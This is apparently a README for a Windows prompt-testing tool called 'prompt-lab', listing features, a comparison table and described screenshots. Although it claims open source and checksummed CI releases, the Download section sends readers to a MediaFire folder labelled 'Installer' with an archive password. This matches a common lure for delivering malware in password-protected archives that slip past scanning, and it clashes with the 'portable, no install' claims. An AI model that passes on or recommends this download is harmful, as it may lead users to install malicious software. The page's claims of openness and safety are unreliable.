# prompt-lab

🧪 Free, open-source prompt testing bench for local models on Windows — variables, version diffs, batch runs. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Variable slots** — write prompts with {{topic}} and {{tone}} placeholders, then run a matrix of test values
- ✅ **Version diff** — every edit saved as a revision; side-by-side diff shows what actually changed
- ✅ **Batch matrix runs** — variables crossed with models, outputs collected in one result grid
- ✅ **Side-by-side outputs** — old prompt versus new prompt on the same inputs, scored with quick labels
- ✅ **Case import** — CSV and JSON test cases pulled in without retyping prompts
- ✅ **Run history** — every run timestamped with model, settings and full output, searchable
- ✅ **100 MB self-contained exe** — runtime and inference backend bundled, portable, offline, MIT with SHA-256 releases

## Why prompt-lab

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **prompt-lab** | Open WebUI | LM Studio | PromptPerfect |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free | Paid |
| Open source | **Yes** | Yes | No | No |
| Variable matrix runs | **Yes** | No | No | Partial |
| Prompt version diff | **Yes** | No | No | Partial
| Batch CSV test cases | **Yes** | No | No | Yes web
| Portable, no install | **Yes, 100 MB** | Docker | Installer | Browser

## FAQ

**how to test and improve prompts for local LLMs without guesswork?**

Editing a prompt and eyeballing one answer proves nothing; real improvement needs the same inputs run against old and new versions. prompt-lab keeps a diffed history, runs variable matrices in batch and stores every result row. It is a 100 MB portable exe, MIT, offline, no account.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark lab (#121418, teal #2DD4BF): template editor left with {{topic}} highlighted, variable value matrix center, result grid right with model columns and score chips.
2. Version diff view: two prompt revisions in split panes, changed lines tinted, restore button on the older revision, run-count badge reading tested 7 times.
3. Batch runner: 3 variables by 2 models grid at 83 percent, live log lines per cell, cancel button, footer chip reading run folder created.

## Download

| Source | Link |
|---|---|
| 💾 **Installer prompt-lab** | [Installer prompt-lab](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).